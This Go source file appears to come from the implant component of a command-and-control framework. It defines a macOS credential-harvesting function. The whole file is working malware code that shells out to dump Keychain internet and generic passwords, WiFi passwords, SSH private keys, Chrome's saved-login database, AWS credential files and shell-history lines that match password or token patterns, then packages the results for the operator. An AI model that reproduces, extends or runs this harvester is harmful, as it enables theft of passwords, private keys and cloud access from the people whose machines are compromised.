//go:build darwin

package implant

import (
	"fmt"
	"strings"
)

// HarvestCredsDarwin collects macOS credentials from multiple sources.
func HarvestCredsDarwin(args []string) ([]byte, error) {
	var results []string

	// 1. Keychain — dump internet passwords (non-interactive; only works without SIP or with TCC bypass)
	keychainOut, _ := ExecuteShell([]string{`security find-internet-password -g 2>&1 | head -100`})
	if len(keychainOut) > 0 {
		results = append(results, "=== KEYCHAIN (Internet Passwords) ===\n"+string(keychainOut))
	}

	// 2. Keychain — generic passwords
	genericOut, _ := ExecuteShell([]string{`security find-generic-password -g 2>&1 | head -100`})
	if len(genericOut) > 0 {
		results = append(results, "=== KEYCHAIN (Generic Passwords) ===\n"+string(genericOut))
	}

	// 3. WiFi passwords
	wifiOut, _ := ExecuteShell([]string{`for ssid in $(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | xargs); do pw=$(security find-generic-password -D "AirPort network password" -a "$ssid" -w 2>/dev/null); echo "SSID: $ssid | Password: $pw"; done`})
	if len(wifiOut) > 0 {
		results = append(results, "=== WIFI PASSWORDS ===\n"+string(wifiOut))
	}

	// 4. SSH private keys
	sshOut, _ := ExecuteShell([]string{`find ~/.ssh /etc/ssh -name "id_*" ! -name "*.pub" 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done | head -200`})
	if len(sshOut) > 0 {
		results = append(results, "=== SSH PRIVATE KEYS ===\n"+string(sshOut))
	}

	// 5. Browser saved passwords (Chrome)
	chromeOut, _ := ExecuteShell([]string{`sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data "SELECT origin_url,username_value,password_value FROM logins" 2>/dev/null | head -50`})
	if len(chromeOut) > 0 {
		results = append(results, "=== CHROME SAVED PASSWORDS (encrypted) ===\n"+string(chromeOut))
	}

	// 6. AWS/cloud credentials
	awsOut, _ := ExecuteShell([]string{`cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null`})
	if len(awsOut) > 0 {
		results = append(results, "=== AWS CREDENTIALS ===\n"+string(awsOut))
	}

	// 7. Shell history (commands may contain passwords)
	histOut, _ := ExecuteShell([]string{`cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE "password|passwd|token|secret|key|api" | head -50`})
	if len(histOut) > 0 {
		results = append(results, "=== SHELL HISTORY (credential patterns) ===\n"+string(histOut))
	}

	if len(results) == 0 {
		return []byte("[-] No credentials found (may need elevated access for keychain)"), nil
	}

	return []byte(fmt.Sprintf("[+] macOS Credential Harvest Results:\n\n%s", strings.Join(results, "\n\n"))), nil
}
